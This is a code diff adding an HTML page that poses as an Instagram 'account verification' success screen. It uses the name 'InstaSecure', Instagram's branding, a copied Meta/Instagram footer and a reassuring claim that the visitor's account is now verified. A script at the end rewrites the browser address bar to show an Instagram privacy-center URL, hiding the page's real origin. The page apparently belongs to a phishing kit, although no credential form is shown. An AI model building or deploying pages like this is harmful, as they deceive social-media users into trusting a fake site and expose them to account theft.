@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Account Verified - InstaSecure</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    /* body {
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: linear-gradient(135deg, #fdfbfb, #ebedee);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 40px 15px;
+    } */
+
+    body {
+      background: #fff;
+      border-radius: 20px;
+      width: 100vw;
+      padding: 50px 35px;
+      box-shadow: 0 20px 45px rgba(0,0,0,0.12);
+      text-align: center;
+      transition: all 0.5s ease;
+      user-select: none;
+      position: relative;
+
+    }
+
+    /* Gradient decorative dots */
+    .dots {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      display: flex;
+      gap: 8px;
+    }
+
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+      animation: glow 2s infinite alternate;
+    }
+
+    @keyframes glow {
+      from { opacity: 0.6; transform: scale(1); }
+      to { opacity: 1; transform: scale(1.2); }
+    }
+
+    .logo {
+      font-size: 48px;
+      font-family: 'Billabong', cursive;
+      color: #262626;
+      margin-bottom: 25px;
+    }
+
+    /* Circular verified tick badge */
+    .verified-badge {
+      display: inline-flex;
+      justify-content: center;
+      align-items: center;
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+      color: #fff;
+      font-size: 65px;
+      margin-bottom: 20px;
+      animation: tickPop 0.7s ease-in-out;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+    }
+
+    @keyframes tickPop {
+      0% { transform: scale(0.6); opacity: 0.4; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    h1 {
+      font-size: 2em;
+      color: #333;
+      margin-bottom: 20px;
+      background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    p {
+      font-size: 20px;
+      color: #555;
+      line-height: 1.7;
+      margin-bottom: 15px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .success-text {
+      margin-top: 25px;
+      font-size: 26px;
+      font-weight: 700;
+      color: black;
+      animation: pop 0.6s ease-in-out;
+    }
+
+    @keyframes pop {
+      0% { transform: scale(0.8); opacity: 0.5; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .security-instructions {
+      /* background: #f9f9f9; */
+      border-radius: 12px;
+      padding: 25px;
+      margin-top: 35px;
+      text-align: left;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.08);
+      /* max-width: 700px; */
+      margin-left: auto;
+      margin-right: auto;
+      color: #333;
+      font-size: 19px;
+      line-height: 1.7;
+      position: relative;
+    }
+
+    .security-instructions h2 {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 22px;
+      color: #222;
+      margin-bottom: 15px;
+    }
+
+    .dot-title {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+    }
+
+    .security-instructions ul {
+      list-style-type: disc;
+      padding-left: 25px;
+    }
+
+    .security-instructions li {
+      margin-bottom: 10px;
+    }
+
+     footer {
+      width: 100%;
+      max-width: 1400px;
+      margin: auto;
+    }
+
+    .footer-columns {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 50px;
+      margin-bottom: 40px;
+    }
+
+    .footer-columns h4 {
+      font-size: 1.5rem;
+      margin-bottom: 20px;
+      font-weight: 500;
+      display: flex;
+      justify-content: flex-start;
+    }
+
+    .footer-columns ul {
+      list-style: none;
+    }
+
+    .footer-columns ul li {
+      margin: 8px 0;
+    }
+
+    .footer-columns ul li a {
+      text-decoration: none;
+      color: #555;
+      font-size: 0.95rem;
+      transition: 0.3s;
+      display: flex;
+      justify-content: flex-start;
+    }
+
+    .footer-columns ul li a:hover {
+      color: #000;
+      text-decoration: underline;
+    }
+
+    .social-icons {
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+      margin: 40px 0;
+    }
+
+    .social-icons a {
+      color: #000;
+      font-size: 1.4rem;
+      border: 1px solid #ddd;
+      border-radius: 50%;
+      width: 45px;
+      height: 45px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+    }
+
+    .social-icons a:hover {
+      background: #000;
+      color: #fff;
+      transform: translateY(-3px);
+    }
+
+    .bottom-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+      font-size: 0.9rem;
+      color: #555;
+      border-top: 1px solid #eee;
+      padding-top: 20px;
+    }
+
+    .bottom-links a {
+      text-decoration: none;
+      color: #555;
+      transition: 0.3s;
+    }
+
+    .bottom-links a:hover {
+      color: #000;
+    }
+
+    @media (max-width: 768px) {
+      body {
+        padding: 20px;
+      }
+      .social-icons a {
+        width: 40px;
+        height: 40px;
+        font-size: 1.2rem;
+      }
+      .footer-columns {
+        gap: 30px;
+      }
+    }
+
+    @media (max-width: 900px) {
+      .card {
+        width: 95%;
+        padding: 35px 20px;
+      }
+
+      .logo {
+        font-size: 42px;
+      }
+
+      h1 {
+        font-size: 1.7em;
+      }
+
+      .verified-badge {
+        width: 100px;
+        height: 100px;
+        font-size: 55px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 25px 15px;
+      }
+      h1 {
+        font-size: 1.4em;
+      }
+      .logo {
+        font-size: 34px;
+      }
+      p, .security-instructions {
+        font-size: 14px;
+      }
+      .verified-badge {
+        width: 85px;
+        height: 85px;
+        font-size: 45px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="card" role="main" aria-label="Account Verified Information">
+    <div class="dots">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+
+    <!-- <div class="logo">InstaSecure</div> -->
+    <div class="verified-badge" aria-hidden="true">✔</div>
+    <h1>🎉 Account Verification Request Sent Successfully!</h1>
+    <p>Your account has been successfully verified. You are now a trusted member of our InstaSecure community.</p>
+    <p>Enjoy full access to all security features, instant alerts, and priority support. Your profile now carries the verified badge, boosting your trust and authenticity.</p>
+
+    <div class="success-text" aria-live="polite"> Your security verification is in progress. Once verified, you’ll receive an official confirmation email shortly.</div>
+
+    <section class="security-instructions" aria-label="Security Instructions">
+      <h2><span class="dot-title"></span> Important Security Guidelines</h2>
+      <ul>
+        <li>Never share your password or verification codes with anyone.</li>
+        <li>Enable two-factor authentication (2FA) for enhanced safety.</li>
+        <li>Regularly review your login activity for unusual actions.</li>
+        <li>Keep your contact information up to date for alerts.</li>
+        <li>Use a strong, unique password for your account.</li>
+        <li>Contact our support immediately for any unauthorized activity.</li>
+      </ul>
+    </section>
+    <img src="https://www.v-user.com/images/web-blog/pages/security-of-instagram/security-of-instagram-banner.webp">
+
+    <!-- <div class="footer">© 2025 InstaSecure | Your Privacy, Our Commitment</div> -->
+  </div>
+  <footer>
+    <div class="footer-columns">
+      <div>
+        <h4><a href="#" ></a>Our Story</h4>
+        <ul>
+          <li><a href="https://about.meta.com/media-gallery/executives/">Leadership</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_brand&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Fbrand&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_brand">Brand</a></li>
+          <li><a href="https://about.meta.com/brand/resources/instagram/instagram-brand/">Brand Kit</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_careers&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Fabout-us%2Fcareers&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_careers">Working at Instagram</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_external-link&ums_creative_detail=footer_politics&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fwww.facebook.com%2Fgovernment-nonprofits%2Fresources&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_politics">Politics</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4>Features</h4>
+        <ul>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_reels&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Ffeatures%2Freels&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_reels">Reels</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_stories&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Ffeatures%2Fstories&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_stories">Stories</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_direct&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Ffeatures%2Fdirect&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_direct">DMs</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_search-%26-explore&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Ffeatures%2Fsearch-and-explore&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_search-%26-explore">Search & Explore</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4>Safety</h4>
+        <ul>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_acct_safety&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-safety&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_acct_safety">Safety Tools</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_privacy&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Fmicro_site%2Furl%2F%3Fclick_creative_path[0]%3Dclick_internal-link%26ums_creative_detail%3Dfooter_privacy%26click_from_context_menu%3Dtrue%26country%3DIN%26destination%3Dhttps%253A%252F%252Fabout.instagram.com%252Fsafety%252Fprivacy%26event_type%3Dclick%26last_nav_impression_id%3D0mhbwA3i16vfrI2fu%26max_percent_page_viewed%3D99%26max_viewport_height_px%3D738%26max_viewport_width_px%3D1528%26orig_http_referrer%3Dhttps%253A%252F%252Fwww.bing.com%252F%26orig_request_uri%3Dhttps%253A%252F%252Fabout.instagram.com%252Fsafety%252Faccount-security%26region%3Dapac%26scrolled%3Dtrue%26session_id%3D0wXbRMI5di5ct5wem%26site%3Dinstagram_about%26extra_data[creative_detail]%3Dfooter_privacy&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_privacy">Privacy Tools</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_security&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_security">Account Security</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4>Community</h4>
+        <ul>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_educators&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Fcommunity%2Feducators&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_educators">School Partnerships</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_teen-accounts&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Fcommunity%2Fteen-accounts&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_teen-accounts">Teen Accounts</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_anti-bullying&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Fcommunity%2Fanti-bullying&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_anti-bullying">Anti-Bullying</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_parents&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Fcommunity%2Fparents&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_parents">Parents</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer_programs&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Fcommunity%2Fprograms&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_programs">Programs</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4>Threads</h4>
+        <ul>
+          <li><a href="https://www.edits.com/">Edits ↗</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_external-link&ums_creative_detail=footer_igb&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fwww.facebook.com%2Fbusiness%2Finstagram&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_igb">Business</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_external-link&ums_creative_detail=footer_igc&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fcreators.instagram.com%2F&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_igc">Creators</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4>News</h4>
+        <ul>
+          <li><a href="https://about.meta.com/">Meta</a></li>
+          <li><a href="https://familycenter.meta.com/">Family Center</a></li>
+          <li><a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_external-link&ums_creative_detail=footer_help&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fhelp.instagram.com%2F%3Fref%3Dig_about&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_help">Help Center ↗</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="social-icons">
+      <a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_external-link&ums_creative_detail=footer_share_instagram&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fwww.instagram.com%2Finstagram&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_share_instagram"><i class="fab fa-instagram"></i></a>
+      <a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_external-link&ums_creative_detail=footer_share_meta&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fwww.facebook.com%2Finstagram&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer_share_meta"><i class="fab fa-facebook-f"></i></a>
+      <a href="https://twitter.com/instagram"><i class="fab fa-x-twitter"></i></a>
+      <a href="https://www.youtube.com/instagram"><i class="fab fa-youtube"></i></a>
+      <a href="https://www.linkedin.com/company/meta/"><i class="fab fa-linkedin-in"></i></a>
+    </div>
+
+    <div class="bottom-links">
+      <span>English (US)</span>
+      <a href="#">Instagram from Meta</a>
+      <a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_external-link&ums_creative_detail=footer&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Finstagram&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer">API</a>
+      <a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_external-link&ums_creative_detail=footer&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fwww.instagram.com%2Flegal%2Fprivacy%2F&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer">Privacy</a>
+      <a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_external-link&ums_creative_detail=footer&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fwww.instagram.com%2Flegal%2Fterms%2F&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer">Terms</a>
+      <a href="https://about.instagram.com/micro_site/url/?click_creative_path[0]=click_internal-link&ums_creative_detail=footer&click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fabout.instagram.com%2Fsitemap&event_type=click&last_nav_impression_id=0mhbwA3i16vfrI2fu&max_percent_page_viewed=99&max_viewport_height_px=738&max_viewport_width_px=1528&orig_http_referrer=https%3A%2F%2Fwww.bing.com%2F&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2Fsafety%2Faccount-security&region=apac&scrolled=true&session_id=0wXbRMI5di5ct5wem&site=instagram_about&extra_data[creative_detail]=footer">Sitemap</a>
+    </div>
+  </footer>
+  <script>
+      // After page load, change browser history to show Instagram's original URL
+  window.addEventListener('load', function() {
+    const targetURL = "https://privacycenter.instagram.com/dialog/security/";
+    if (window.location.href !== targetURL) {
+      history.replaceState({}, "", targetURL);
+    }
+  });
+  </script>
+</body>
+</html>
